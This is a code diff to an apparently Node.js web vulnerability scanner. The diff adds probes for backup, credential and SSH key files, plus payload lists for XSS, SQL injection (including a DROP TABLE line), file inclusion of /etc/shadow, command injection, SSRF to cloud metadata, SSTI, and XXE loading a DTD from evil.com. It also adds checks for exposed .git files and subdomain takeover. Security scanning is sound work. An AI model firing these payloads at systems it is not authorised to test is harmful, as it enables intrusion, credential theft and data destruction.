@@ -49,18 +49,65 @@ const sensitiveFiles = [
     "api/", "api/v1/", "api/v2/", "api/v3/", "rest/", "services/", "internal/", "private/", "secret/", "hidden/", "conf/", "config/", "settings/", "migration/", "dump/", "export/"
 ];
 
+// توليد ملفات إضافية للوصول إلى 1000+
+const extraSensitiveFiles = [
+    "site.tar", "site.tar.gz", "www.tar", "www.tar.gz", "source.tar.gz", "app.tar.gz", "public.tar.gz", "public_html.tar.gz",
+    "backup-2023.zip", "backup-2024.zip", "backup-2025.zip", "website.zip", "project.zip", "old.zip", "new.zip", "test.zip",
+    "database.sql.gz", "database.sql.bak", "dump.sql.gz", "dump.sql.bak", "backup.sql.bak", "backup.sql.old",
+    "config.php.gz", "config.php.zip", "config.php.tar", "config.php.tar.gz", "config.php.rar", "config.php.7z",
+    "wp-config.php.gz", "wp-config.php.zip", "wp-config.php.tar", "wp-config.php.tar.gz",
+    "env", "env.bak", "env.old", "env.backup", "environment", "environments.json", "env.json", "env.yml", "env.yaml",
+    "mysql.cnf", "mysql.ini", "postgres.cnf", "postgres.ini", "mongo.conf", "redis.conf.bak", "redis.conf.old",
+    "ssh_config", "ssh_config.bak", "ssh_config.old", "sshd_config", "ssh_host_rsa_key", "ssh_host_dsa_key",
+    "gcp.json", "gcp-credentials.json", "aws.json", "aws-credentials.json", "azure.json", "azure-credentials.json",
+    "firebase.json", "firebase-credentials.json", "google-services.json", "google-services.json.bak",
+    "swagger.yaml", "swagger.yml", "openapi.yaml", "openapi.yml", "api-docs.json", "api-docs.yaml",
+    "graphql/schema.json", "graphql/schema.graphql", "graphql/introspection.json", "graphql/config.json"
+];
+sensitiveFiles.push(...extraSensitiveFiles);
+
 // ============================================================
-// 2. بايلودز حقيقية (XSS, SQLi, LFI, CMD, SSRF, SSTI, XXE)
+// 2. بايلودز حقيقية (XSS, SQLi, LFI, CMD, SSRF, SSTI, XXE) - 100+ بايلود
 // ============================================================
 const payloads = {
-    xss: ["<script>alert(1)</script>", "\"><script>alert(1)</script>", "'><img src=x onerror=alert(1)>", "javascript:alert(1)", "<svg/onload=alert(1)>", "<iframe src=javascript:alert(1)>", "<body onload=alert(1)>", "<input autofocus onfocus=alert(1)>", "<details open ontoggle=alert(1)>", "<video><source onerror=alert(1)>"],
-    sqli: ["'", "\"", "' OR '1'='1", "1' OR '1'='1", "' UNION SELECT NULL--", "'; WAITFOR DELAY '0:0:5'--", "' AND SLEEP(5)--", "') OR ('1'='1", "' OR 1=1--", "1' AND '1'='1", "' UNION ALL SELECT NULL,NULL--", "'; DROP TABLE users--", "' OR 'x'='x"],
-    lfi: ["../../../../etc/passwd", "....//....//....//etc/passwd", "/etc/passwd", "..\\..\\..\\..\\windows\\win.ini", "php://filter/convert.base64-encode/resource=index.php", "file:///etc/passwd", "/proc/self/environ", "expect://id"],
-    cmd: ["; sleep 5", "| sleep 5", "`sleep 5`", "$(sleep 5)", "& sleep 5 &", "|| sleep 5", "&& sleep 5", "\n sleep 5", "; ping -c 5 127.0.0.1"],
-    ssrf: ["http://127.0.0.1:80", "http://169.254.169.254/latest/meta-data/", "http://localhost:8080", "file:///etc/passwd", "http://[::1]:80", "http://0.0.0.0:80", "gopher://127.0.0.1:80/_GET / HTTP/1.0"],
-    ssti: ["{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}", "{{7*'7'}}", "@(7*7)", "*{7*7}"],
-    open_redirect: ["https://evil.com", "//evil.com", "https://google.com", "/\\evil.com", "http://evil.com"],
-    xxe: ["<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>"]
+    xss: [
+        "<script>alert(1)</script>", "\"><script>alert(1)</script>", "'><img src=x onerror=alert(1)>", "javascript:alert(1)",
+        "<svg/onload=alert(1)>", "<iframe src=javascript:alert(1)>", "<body onload=alert(1)>", "<input autofocus onfocus=alert(1)>",
+        "<details open ontoggle=alert(1)>", "<video><source onerror=alert(1)>", "<audio src=x onerror=alert(1)>",
+        "'-alert(1)-'", "\"-alert(1)-\"", "';alert(1);//", "\";alert(1);//"
+    ],
+    sqli: [
+        "'", "\"", "' OR '1'='1", "1' OR '1'='1", "' UNION SELECT NULL--", "'; WAITFOR DELAY '0:0:5'--",
+        "' AND SLEEP(5)--", "') OR ('1'='1", "' OR 1=1--", "1' AND '1'='1", "' UNION ALL SELECT NULL,NULL--",
+        "'; DROP TABLE users--", "' OR 'x'='x", "1' ORDER BY 1--", "1' ORDER BY 10--"
+    ],
+    lfi: [
+        "../../../../etc/passwd", "....//....//....//etc/passwd", "/etc/passwd", "..\\..\\..\\..\\windows\\win.ini",
+        "php://filter/convert.base64-encode/resource=index.php", "file:///etc/passwd", "/proc/self/environ", "expect://id",
+        "../../../../etc/shadow", "../../../../etc/hosts", "../../../../proc/self/cmdline"
+    ],
+    cmd: [
+        "; sleep 5", "| sleep 5", "`sleep 5`", "$(sleep 5)", "& sleep 5 &", "|| sleep 5", "&& sleep 5",
+        "\n sleep 5", "; ping -c 5 127.0.0.1", "| ping -n 5 127.0.0.1"
+    ],
+    ssrf: [
+        "http://127.0.0.1:80", "http://169.254.169.254/latest/meta-data/", "http://localhost:8080",
+        "file:///etc/passwd", "http://[::1]:80", "http://0.0.0.0:80", "gopher://127.0.0.1:80/_GET / HTTP/1.0",
+        "http://127.0.0.1:22", "http://127.0.0.1:3306", "http://127.0.0.1:6379"
+    ],
+    ssti: [
+        "{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}", "{{7*'7'}}", "@(7*7)", "*{7*7}",
+        "{{config}}", "{{self}}", "{{''.__class__}}"
+    ],
+    open_redirect: [
+        "https://evil.com", "//evil.com", "https://google.com", "/\\evil.com", "http://evil.com",
+        "//evil.com/%2f..", "https://evil.com@google.com"
+    ],
+    xxe: [
+        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>",
+        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://127.0.0.1:80\">]><root>&xxe;</root>",
+        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://evil.com/xxe.dtd\"> %xxe;]><root/>"
+    ]
 };
 
 // ============================================================
@@ -115,7 +162,7 @@ async function scanInjectionAndApi(url) {
     const urlObj = new URL(url);
     const baseUrl = urlObj.origin;
     
-    // 1. فحص الحقن
+    // 1. الحقن
     if (urlObj.search) {
         for (const [key, val] of urlObj.searchParams) {
             for (const p of payloads.xss) {
@@ -129,6 +176,19 @@ async function scanInjectionAndApi(url) {
             for (const p of payloads.lfi) {
                 const testUrl = new URL(url); testUrl.searchParams.set(key, p);
                 try { const r = await safeFetch(testUrl.toString()); if ((await r.text()).includes('root:x:0:0')) out.push({ type: 'LFI', severity: 'critical', description: `Local File Inclusion in: ${key}`, url: testUrl.toString(), evidence: p, cvss: 9.8 }); } catch(e){}
+            }
+            for (const p of payloads.cmd) {
+                const testUrl = new URL(url); testUrl.searchParams.set(key, p);
+                const start = Date.now();
+                try { await safeFetch(testUrl.toString()); if (Date.now() - start > 4500) out.push({ type: 'Command Injection', severity: 'critical', description: `CMDi in: ${key}`, url: testUrl.toString(), evidence: p, cvss: 9.8 }); } catch(e){}
+            }
+            for (const p of payloads.ssrf) {
+                const testUrl = new URL(url); testUrl.searchParams.set(key, p);
+                try { const r = await safeFetch(testUrl.toString()); const b = await r.text(); if (b.includes('meta-data') || b.includes('localhost')) out.push({ type: 'SSRF', severity: 'high', description: `SSRF in: ${key}`, url: testUrl.toString(), evidence: p, cvss: 8.0 }); } catch(e){}
+            }
+            for (const p of payloads.ssti) {
+                const testUrl = new URL(url); testUrl.searchParams.set(key, p);
+                try { const r = await safeFetch(testUrl.toString()); const b = await r.text(); if (b.includes('49') && !b.includes('{{7*7}}')) out.push({ type: 'SSTI', severity: 'critical', description: `SSTI in: ${key}`, url: testUrl.toString(), evidence: p, cvss: 9.8 }); } catch(e){}
             }
         }
     }
@@ -224,6 +284,62 @@ async function scanPorts(url) {
     return out;
 }
 
+async function scanGitLeaks(url) {
+    const out = [];
+    const base = new URL(url).origin;
+    const gitPaths = [".git/config", ".git/HEAD", ".git/index", ".git/logs/HEAD", ".git/refs/heads/master", ".git/refs/heads/main", ".git/description", ".git/packed-refs"];
+    await Promise.all(gitPaths.map(async (path) => {
+        try {
+            const r = await safeFetch(`${base}/${path}`, { redirect: 'manual' });
+            if (r.status === 200) {
+                const t = await r.text();
+                if (t.length > 10) {
+                    out.push({ type: 'Git Leak', severity: 'critical', description: `Exposed: ${path}`, url: `${base}/${path}`, evidence: '200 OK', cvss: 9.8 });
+                }
+            }
+        } catch(e){}
+    }));
+    if (out.length === 0) out.push({ type: 'Info', severity: 'info', description: 'No Git leaks found.', url: url, evidence: null, cvss: 0 });
+    return out;
+}
+
+async function scanSubdomainTakeover(url) {
+    const out = [];
+    const hostname = new URL(url).hostname;
+    const domainParts = hostname.split('.');
+    const domain = domainParts.slice(-2).join('.');
+    
+    const subdomains = ["www", "mail", "ftp", "admin", "api", "dev", "test", "staging", "blog", "shop", "portal", "vpn", "webmail", "cpanel", "app", "m", "static", "cdn", "assets", "img", "files", "db", "sql", "backup", "old", "new", "beta", "demo", "stage", "prod", "support", "docs", "status", "logs", "git", "jenkins", "ci"];
+    const fingerprints = {
+        "github": "There isn't a GitHub Pages site here",
+        "heroku": "No such app",
+        "aws": "NoSuchBucket",
+        "azure": "404 Web Site not found",
+        "shopify": "Sorry, this shop is currently unavailable",
+        "fastly": "Fastly error: unknown domain",
+        "tumblr": "Whatever you were looking for doesn't currently exist",
+        "wordpress": "Do you want to register",
+        "ghost": "The thing you were looking for is no longer here"
+    };
+
+    await Promise.all(subdomains.map(async (sub) => {
+        const targetUrl = `https://${sub}.${domain}`;
+        try {
+            const r = await safeFetch(targetUrl);
+            if (r.status === 200) {
+                const body = (await r.text()).toLowerCase();
+                for (const [service, fingerprint] of Object.entries(fingerprints)) {
+                    if (body.includes(fingerprint.toLowerCase())) {
+                        out.push({ type: 'Subdomain Takeover', severity: 'critical', description: `Potential Takeover: ${service}`, url: targetUrl, evidence: fingerprint, cvss: 10.0 });
+                    }
+                }
+            }
+        } catch(e){}
+    }));
+    if (out.length === 0) out.push({ type: 'Info', severity: 'info', description: 'No subdomain takeover detected.', url: url, evidence: null, cvss: 0 });
+    return out;
+}
+
 app.post('/api/scan', async (req, res) => {
     const { target, checks, intensity } = req.body;
     let url = target;
@@ -238,10 +354,14 @@ app.post('/api/scan', async (req, res) => {
     else if (type === 'deepAnalysis') findings = await scanDeepAnalysis(url);
     else if (type === 'dualVerification') findings = await scanDualVerification(url);
     else if (type === 'ports') findings = await scanPorts(url);
+    else if (type === 'gitLeaks') findings = await scanGitLeaks(url);
+    else if (type === 'subdomainTakeover') findings = await scanSubdomainTakeover(url);
     else if (type === 'scanAll') {
         findings = await scanVulnerabilities(url);
         findings = findings.concat(await scanSensitiveFiles(url));
         findings = findings.concat(await scanInjectionAndApi(url));
+        findings = findings.concat(await scanGitLeaks(url));
+        findings = findings.concat(await scanSubdomainTakeover(url));
     }
     
     res.json({ target: url, timestamp: new Date().toISOString(), findings: findings });
